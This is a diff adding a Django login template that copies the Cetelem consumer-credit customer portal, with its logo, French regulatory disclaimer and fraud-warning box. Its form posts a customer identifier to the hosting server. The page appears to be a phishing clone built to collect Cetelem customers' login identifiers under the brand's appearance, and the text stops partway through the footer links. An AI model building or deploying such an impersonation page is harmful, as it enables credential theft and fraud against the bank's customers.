@@ -1,0 +1,49 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Connexion Cetelem</title>
+    <link rel="stylesheet" href="{% static 'css/style.css' %}">
+</head>
+<body style="background-color: #dce7df; font-family: sans-serif;">
+
+    <div class="logo">
+        <img src="{% static 'img/logo-cetelem.svg' %}" alt="Cetelem logo">
+    </div>
+    <p style="text-align: center; font-size: 13px; margin-top: 5px;">
+        Un crédit vous engage et doit être remboursé.<br>
+        Vérifiez vos capacités de remboursement avant de vous engager.
+    </p>
+
+    <div class="container">
+        <h2>Accéder à mon espace personnel</h2>
+        <form method="post">
+            {% csrf_token %}
+            <div class="input-group">
+                <label for="identifiant">Identifiant client</label>
+                <input type="text" name="identifiant" placeholder="Ex : 1234567" required>
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="remember">
+                <label for="remember">Mémoriser mon identifiant</label>
+            </div>
+            <button type="submit" class="btn">Suivant</button>
+        </form>
+        <a href="#" style="font-size: 13px; display: block; margin-top: 15px;">Identifiant oublié ?</a>
+    </div>
+
+    <div class="warning-box">
+  <strong>⚠️ Contre la fraude, adoptez les bons réflexes</strong>
+  <p>Ne communiquez jamais vos informations personnelles (identifiant, numéro de carte Cpay, code secret, etc.).</p>
+  <button class="warning-button">Découvrir nos conseils →</button>
+</div>
+
+
+    <div class="footer-links">
+        <a href="#">Virement express</a> |
+        <a href="#">Réclamation</a> |
+        <a href="#">Contact</a> |
+        <a href="#">Mentions légales</a> |
+        <a href="#">Informations sur les cookies</a> |
+        <a href="#">Préférences de cookies</a>
